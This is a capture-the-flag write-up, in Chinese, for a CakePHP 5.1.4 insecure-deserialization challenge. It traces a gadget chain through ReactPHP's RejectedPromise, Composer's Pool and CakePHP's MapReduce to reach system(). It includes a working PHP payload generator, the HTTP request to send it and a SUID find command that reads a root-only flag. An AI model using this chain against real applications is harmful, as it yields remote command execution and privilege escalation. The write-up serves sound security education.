# SU_POP

## 题目简述

题目基于 CakePHP 5.1.4。路由 `/ser` 从查询参数读取 Base64 字符串，并直接交给 PHP 原生反序列化：

```php
public function handleSer()
{
    $ser = $this->request->getQuery('ser');
    unserialize(base64_decode($ser));
    $this->set('ser', $ser);
    $this->viewBuilder()->setLayout('ajax');
    $this->render('handle_ser');
}
```

这里没有签名校验，也没有为 `unserialize()` 设置 `allowed_classes`。完整依赖已经包含在题目提供的 CakePHP 压缩包内，因此目标是从现有类中构造一条 POP 链。

当前 Dockerfile 使用 `php:8.4-apache`，仓库中的通用环境 README 所写 PHP 8.0 已经过时，应以 Dockerfile 为准。flag 位于 `/flag.txt`，权限为 `0400`；容器同时把 `/usr/bin/find` 设为 SUID，攻击者需要先执行命令，再借该程序的有效 UID 读取 flag。

## 解题过程

### 1. 确认入口可控

应用注册了：

```php
$builder->get('/ser', [
    'controller' => 'Pages',
    'action' => 'handleSer',
]);
```

传入的数据依次经过：

```text
GET /ser?ser=<URL 编码后的 Base64>
  -> base64_decode()
  -> unserialize()
  -> 对象析构
```

反序列化时不会调用普通构造函数，因此即使某个真实类的构造函数带有严格类型，也可以直接恢复攻击者指定的属性状态。这一点正好可以绕过后面 `RejectedPromise` 构造函数对 `Throwable` 的限制。

### 2. 从 `RejectedPromise` 找到析构入口

`React\Promise\Internal\RejectedPromise` 有两个私有属性：

```php
private $reason;
private $handled = false;
```

其析构函数在对象尚未被处理且没有全局 rejection handler 时执行：

```php
public function __destruct()
{
    if ($this->handled) {
        return;
    }

    $handler = set_rejection_handler(null);
    if ($handler === null) {
        $message = 'Unhandled promise rejection with ' . $this->reason;
        error_log($message);
        return;
    }

    $handler($this->reason);
}
```

把 `$handled` 设为 `false`，再让 `$reason` 指向一个实现了 `__toString()` 的对象，字符串拼接就会进入下一个魔术方法。真实构造函数要求 `$reason` 是 `Throwable`，但 `unserialize()` 不经过构造函数，所以这里可以放入 `Composer\DependencyResolver\Pool`。

### 3. 用 `Pool::__toString()` 推进到迭代器

`Pool` 的 `__toString()` 会遍历 `$packages`：

```php
public function __toString(): string
{
    $str = "Pool:\n";
    foreach ($this->packages as $package) {
        $str .= '- '
            . str_pad((string)$package->id, 6, ' ', STR_PAD_LEFT)
            . ': '
            . $package->getName()
            . "\n";
    }
    return $str;
}
```

因此令：

```text
Pool::$packages = Cake\Collection\Iterator\MapReduce
```

当 `foreach` 开始遍历时，PHP 会调用 `MapReduce::getIterator()`：

```php
public function getIterator(): Traversable
{
    if (!$this->_executed) {
        $this->_execute();
    }

    return new ArrayIterator($this->_result);
}
```

只要把 `$_executed` 设为 `false`，就会进入 `_execute()`。

### 4. 利用 `MapReduce` 调用任意函数

`MapReduce::_execute()` 的关键逻辑为：

```php
$mapper = $this->_mapper;
foreach ($this->_data as $key => $val) {
    $mapper($val, $key, $this);
}
```

设置：

```text
_mapper = call_user_func
_data   = [命令字符串 => system]
```

循环中的实际调用便成为：

```php
call_user_func('system', '命令字符串', $mapReduceObject);
```

第二个传给 `system()` 的参数对应可选的退出状态参数。即使产生引用相关警告，第一参数中的命令仍会执行。由此得到完整调用链：

```text
RejectedPromise::__destruct()
  -> 拼接 $reason
  -> Pool::__toString()
  -> foreach ($packages)
  -> MapReduce::getIterator()
  -> MapReduce::_execute()
  -> call_user_func()
  -> system()
```

### 5. 生成序列化载荷

下面的最小脚本只声明与目标同名、同可见性的必要属性。它不需要加载整套 CakePHP；序列化结果传到目标后，会由目标环境中的真实类接管：

```php
<?php

namespace Cake\Collection\Iterator {
    class MapReduce
    {
        protected bool $_executed;
        protected $_mapper;
        protected iterable $_data;

        public function __construct(
            bool $executed,
            callable $mapper,
            iterable $data
        ) {
            $this->_executed = $executed;
            $this->_mapper = $mapper;
            $this->_data = $data;
        }
    }
}

namespace Composer\DependencyResolver {
    class Pool
    {
        protected $packages;

        public function __construct($packages)
        {
            $this->packages = $packages;
        }
    }
}

namespace React\Promise\Internal {
    class RejectedPromise
    {
        private $handled;
        private $reason;

        public function __construct($reason)
        {
            $this->handled = false;
            $this->reason = $reason;
        }
    }
}

namespace {
    $command = '/usr/bin/find /flag.txt -exec /bin/cat {} \;';

    $mapReduce = new \Cake\Collection\Iterator\MapReduce(
        false,
        'call_user_func',
        [$command => 'system']
    );
    $pool = new \Composer\DependencyResolver\Pool($mapReduce);
    $payload = new \React\Promise\Internal\RejectedPromise($pool);

    echo rawurlencode(base64_encode(serialize($payload))), PHP_EOL;
}
```

这里使用 `rawurlencode()` 很重要：普通 Base64 中的 `+` 如果直接放入查询字符串，可能被解析为空格。

将脚本输出填入：

```http
GET /ser?ser=<payload> HTTP/1.1
Host: challenge
Connection: close

```

`system()` 先启动带 SUID 位的 `/usr/bin/find`，再由它执行 `/bin/cat /flag.txt`。仓库中的静态 flag 为：

```text
SUCTF{PoP_CHaiN5_@Re_SO_fUn!!!}
```

## 方法总结

本题的重点是把四个看似无关的行为连成一条可执行路径：

1. `RejectedPromise::__destruct()` 会把可控的 `$reason` 转成字符串；
2. `Pool::__toString()` 会遍历可控的 `$packages`；
3. `MapReduce::getIterator()` 会在未执行状态下调用 `_execute()`；
4. `_execute()` 把可控 mapper、键和值组合成函数调用。

审计框架 POP 链时，不应只搜索显眼的 `__destruct()` 或 `__wakeup()`。字符串转换、迭代协议和回调型容器经常负责把链条从魔术方法推进到危险函数。另一方面，能执行普通命令不等于已经读取 flag；还必须结合容器权限配置，利用题目特意设置的 SUID `find` 完成最后的权限跨越。
